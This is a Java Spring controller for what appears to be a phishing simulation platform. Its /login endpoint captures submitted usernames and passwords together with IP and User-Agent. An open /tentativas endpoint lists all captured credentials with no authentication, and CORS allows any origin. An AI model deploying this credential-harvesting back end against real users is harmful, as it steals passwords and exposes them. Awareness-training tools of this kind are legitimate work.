package com.example.phishing_platform.controller;


import com.example.phishing_platform.model.LogPhishing;
import com.example.phishing_platform.service.LogPhishingService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import jakarta.servlet.http.HttpServletRequest;
import java.util.List;

@RestController
@RequestMapping("/api/phishing")
@CrossOrigin(origins = "*")
public class LogPhishingController {

    @Autowired
    private LogPhishingService service;

    // Endpoint para registrar tentativa de phishing
    @PostMapping("/login")
    public String registrar(
            @RequestParam String plataforma,
            @RequestParam String username,
            @RequestParam String password,
            HttpServletRequest request
    ) {
        String ip = request.getRemoteAddr();
        String userAgent = request.getHeader("User-Agent");
        service.registrar(plataforma, username, password, ip, userAgent);
        return "Tentativa registrada! (Simulação)";
    }

    // Endpoint para dashboard
    @GetMapping("/tentativas")
    public List<LogPhishing> listar() {
        return service.listar();
    }
}

